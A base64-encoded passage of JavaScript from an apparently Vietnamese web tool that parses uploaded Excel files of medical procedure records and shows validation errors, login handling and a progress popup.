RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIA0KICAgICAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24gS+G6v3QgUXXhuqMgS2nhu4NtIFRyYQ0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJlc3VsdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpOw0KICAgICAgICAgICAgaWYgKHJlc3VsdFNlY3Rpb24gJiYgcmVzdWx0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZScpIHsNCiAgICAgICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhyZXN1bHRTZWN0aW9uLCAtNDApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9LCAzMDApOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIHThu6tuZyBs4buXaQ0KICAgIGVycm9yTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnByb2NlZHVyZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iPiR7ZXJyb3IuZGV0YWlscy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5vcGVyYXRvciA/IGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRldGFpbHMubmdheVRodWNIaWVuIHx8IChlcnJvci5kZXRhaWxzLmRhdGUgfHwgJ0tow7RuZyBjw7MnKX0gPGJyLz4ke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lID8gYCR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWV9IC0gJHtlcnJvci5kZXRhaWxzLmVuZFRpbWV9YCA6ICdLaMO0bmcgY8OzJ308L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWQgPyBgJHtlcnJvci5kZXRhaWxzLmFjdHVhbH0gcGjDunQgICAoUXV5IMSR4buLbmg6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNiIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBDdeG7mW4geHXhu5FuZyBwaOG6p24gbOG7l2kgbuG6v3UgY8OzDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGNvbnN0IGVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKTsNCiAgICAgICAgaWYgKGVycm9yU2VjdGlvbikgew0KICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8oZXJyb3JTZWN0aW9uLCAtMTMwKTsNCiAgICAgICAgfQ0KICAgIH0sIDMwMCk7DQp9DQoNCi8vIEjDoG0gY3Xhu5luIG3GsOG7o3QgdOG7lW5nIHF1w6F0DQpmdW5jdGlvbiBzbW9vdGhTY3JvbGxUbyhlbGVtZW50LCBvZmZzZXQgPSAwKSB7DQogICAgZWxlbWVudC5jbGFzc0xpc3QuYWRkKCdoaWdobGlnaHQtZXJyb3Itc2VjdGlvbicpOw0KICAgIA0KICAgIGNvbnN0IGVsZW1lbnRQb3NpdGlvbiA9IGVsZW1lbnQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCkudG9wOw0KICAgIGNvbnN0IG9mZnNldFBvc2l0aW9uID0gZWxlbWVudFBvc2l0aW9uICsgd2luZG93LnBhZ2VZT2Zmc2V0IC0gb2Zmc2V0Ow0KICAgIA0KICAgIGNvbnN0IGR1cmF0aW9uID0gMTUwMDsNCiAgICBjb25zdCBzdGFydCA9IHdpbmRvdy5wYWdlWU9mZnNldDsNCiAgICBjb25zdCBzdGFydFRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICANCiAgICBmdW5jdGlvbiBzY3JvbGxTdGVwKHRpbWVzdGFtcCkgew0KICAgICAgICBjb25zdCBlbGFwc2VkID0gdGltZXN0YW1wIC0gc3RhcnRUaW1lOw0KICAgICAgICBjb25zdCBwcm9ncmVzcyA9IE1hdGgubWluKGVsYXBzZWQgLyBkdXJhdGlvbiwgMSk7DQogICAgICAgIGNvbnN0IGVhc2luZyA9IGVhc2VJbk91dEN1YmljKHByb2dyZXNzKTsNCiAgICAgICAgd2luZG93LnNjcm9sbFRvKDAsIHN0YXJ0ICsgKG9mZnNldFBvc2l0aW9uIC0gc3RhcnQpICogZWFzaW5nKTsNCiAgICAgICAgDQogICAgICAgIGlmIChwcm9ncmVzcyA8IDEpIHsNCiAgICAgICAgICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gZWFzZUluT3V0Q3ViaWModCkgew0KICAgICAgICByZXR1cm4gdCA8IDAuNSA/IDQgKiB0ICogdCAqIHQgOiAxIC0gTWF0aC5wb3coLTIgKiB0ICsgMiwgMykgLyAyOw0KICAgIH0NCiAgICANCiAgICB3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHNjcm9sbFN0ZXApOw0KICAgIA0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBlbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgfSwgMjAwMCk7DQp9DQoNCg0KIA0KDQogICAgICAgIGZ1bmN0aW9uIHBhcnNlRGF0ZVRpbWUoZGF0ZXRpbWVTdHIsIHJvd0luZGV4KSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGlmICghZGF0ZXRpbWVTdHIpIHsNCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ251bWJlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhjZWxEYXRlID0gbmV3IERhdGUoTWF0aC5yb3VuZCgoZGF0ZXRpbWVTdHIgLSAyNTU2OSkgKiA4NjQwMCAqIDEwMDApKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF5ID0gZXhjZWxEYXRlLmdldERhdGUoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbW9udGggPSBleGNlbERhdGUuZ2V0TW9udGgoKSArIDE7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHllYXIgPSBleGNlbERhdGUuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaG91cnMgPSBleGNlbERhdGUuZ2V0SG91cnMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IGV4Y2VsRGF0ZS5nZXRNaW51dGVzKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSBleGNlbERhdGUuZ2V0U2Vjb25kcygpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVPYmo6IGV4Y2VsRGF0ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBob3VycyAqIDYwICsgbWludXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IGhvdXJzICogMzYwMCArIG1pbnV0ZXMgKiA2MCArIHNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0ZXRpbWVTdHIgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBkYXRlUGFydCwgdGltZVBhcnQgPSAnMDA6MDA6MDAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZXRpbWVTdHIuaW5jbHVkZXMoJyAnKSkgW2RhdGVQYXJ0LCB0aW1lUGFydF0gPSBkYXRldGltZVN0ci5zcGxpdCgnICcpOw0KICAgICAgICAgICAgICAgICAgICBlbHNlIGRhdGVQYXJ0ID0gZGF0ZXRpbWVTdHI7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBsZXQgZGF5LCBtb250aCwgeWVhcjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFtkYXksIG1vbnRoLCB5ZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbZGF5LCBtb250aF0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChkYXRlUGFydC5pbmNsdWRlcygnLScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IGRhdGVQYXJ0LnNwbGl0KCctJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSBbeWVhciwgbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMikgW21vbnRoLCBkYXldID0gcGFydHMubWFwKE51bWJlciksIHllYXIgPSBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIG5nw6B5IGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF5KSB8fCBpc05hTihtb250aCkgfHwgaXNOYU4oeWVhcikgfHwgZGF5IDwgMSB8fCBkYXkgPiAzMSB8fCBtb250aCA8IDEgfHwgbW9udGggPiAxMikgew0KICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdHacOhIHRy4buLIG5nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBob3VycyA9IDAsIG1pbnV0ZXMgPSAwLCBzZWNvbmRzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHRpbWVQYXJ0LmluY2x1ZGVzKCc6JykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVQYXJ0cyA9IHRpbWVQYXJ0LnNwbGl0KCc6Jyk7DQogICAgICAgICAgICAgICAgICAgICAgICBob3VycyA9IHBhcnNlSW50KHRpbWVQYXJ0c1swXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXMgPSBwYXJzZUludCh0aW1lUGFydHNbMV0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gcGFyc2VJbnQodGltZVBhcnRzWzJdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oaG91cnMpIHx8IGlzTmFOKG1pbnV0ZXMpIHx8IGlzTmFOKHNlY29uZHMpIHx8IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzIDwgMCB8fCBob3VycyA+IDIzIHx8IG1pbnV0ZXMgPCAwIHx8IG1pbnV0ZXMgPiA1OSB8fCBzZWNvbmRzIDwgMCB8fCBzZWNvbmRzID4gNTkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignR2nDoSB0cuG7iyB0aOG7nWkgZ2lhbiBraMO0bmcgaOG7o3AgbOG7hycsIHJvd0luZGV4LCB7IHRpbWU6IHRpbWVQYXJ0IH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gMDsgbWludXRlcyA9IDA7IHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlT2JqID0gbmV3IERhdGUoeWVhciwgbW9udGggLSAxLCBkYXksIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGRhdGVPYmouZ2V0VGltZSgpKSkgdGhyb3cgbmV3IEVycm9yKCdOZ8OgeSBraMO0bmcgaOG7o3AgbOG7hycpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kc0luRGF5ID0gaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kczsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlc0luRGF5ID0gaG91cnMgKiA2MCArIG1pbnV0ZXM7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iaiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBtaW51dGVzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzOiBzZWNvbmRzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCfEkOG7i25oIGThuqFuZyB0aOG7nWkgZ2lhbiBraMO0bmcgxJHGsOG7o2MgaOG7lyB0cuG7oycpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgcGjDom4gdMOtY2ggdGjhu51pIGdpYW46ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dJbmRleCwgeyANCiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGRhdGV0aW1lU3RyLA0KICAgICAgICAgICAgICAgICAgICBlcnJvckRldGFpbHM6IGVycm9yLnN0YWNrIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLy8gPT09PT09PT09PSBLSOG7nkkgVOG6oE8gU+G7sCBLSeG7hk4gPT09PT09PT09PSAvLw0KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykuZm9jdXMoKTsNCiAgICAgICAgICAgIC8vIEtoaSB0cmFuZyBsb2FkDQogICAgICAgICAgICBpZiAoIXNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSkgew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIMSRxINuZyBuaOG6rXAga2hpIHRyYW5nIHThuqNpDQoJCQ0KCQkJDQogICAgICAgICAgICBjaGVja1NhdmVkTG9naW4oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgbmjhuq1wDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gdHJ1ZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjaGVja0xvZ2luKCk7DQp9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgeHXhuqV0DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nb3V0QnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgaXNMb2dpbkFjdGlvbiA9IGZhbHNlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGxvZ291dCgpOw0KfSk7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gxJDEg25nIG5o4bqtcCBi4bqxbmcgcGjDrW0gRW50ZXINCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgICAgICAgICAgICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tMb2dpbigpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IHBow6JuIHTDrWNoIGZpbGUNCiAgICAgICAgICAgIA0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGFzeW5jICgpID0+IHsNCiAgYXdhaXQgZW5zdXJlWExTWCgpOyAvLyBu4bqhcCBYTFNYIMSRw7puZyBsw7pjIGTDuW5nDQogICAgY29uc3QgZmlsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5maWxlc1swXTsNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1wYXBlci1wbGFuZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgZ+G7rWkgZOG7ryBsaeG7h3UgduG7gSBtw6F5IGNo4bunLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICczMyUnOw0KCQ0KCQ0KCQ0KCWNvbnN0IHByb2dyZXNzQmFyQ29udGFpbmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyQ29udGFpbmVyJyk7DQoNCi8vIENo4buJIHThuqFvIDEgbOG6p24NCmlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NyZWRpdExpbmVCZWxvdycpKSB7DQogIGNvbnN0IGNyZWRpdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBjcmVkaXQuaWQgPSAnY3JlZGl0TGluZUJlbG93JzsNCiAgY3JlZGl0LmlubmVyVGV4dCA9ICfCqSBUaGnhur90IGvhur8gJiBwaMOhdCB0cmnhu4NuIGLhu59pIENow6J1IEh14buzbmgnOw0KICBjcmVkaXQuc3R5bGUubWFyZ2luVG9wID0gJzEwcHgnOw0KICBjcmVkaXQuc3R5bGUuZm9udFNpemUgPSAnMTZweCc7DQogIGNyZWRpdC5zdHlsZS5jb2xvciA9ICcjRkYwMDAwJzsNCiAgY3JlZGl0LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOw0KDQogIHByb2dyZXNzQmFyQ29udGFpbmVyLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGNyZWRpdCwgcHJvZ3Jlc3NCYXJDb250YWluZXIubmV4dFNpYmxpbmcpOw0KfQ0KCQ0KCQ0KCQ0KCQ0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNTApKSk7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDcwMCkpOw0KDQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnNjYlJzsNCg0KICAgIGxldCB0b3RhbCA9IDA7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgZmlsZVJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7DQogICAgICAgICAgICBmaWxlUmVhZGVyLm9ubG9hZCA9IGUgPT4gcmVzb2x2ZShuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpKTsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25lcnJvciA9ICgpID0+IHJlamVjdChuZXcgRXJyb3IoIkzhu5dpIMSR4buNYyBmaWxlIikpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5yZWFkQXNBcnJheUJ1ZmZlcihmaWxlKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2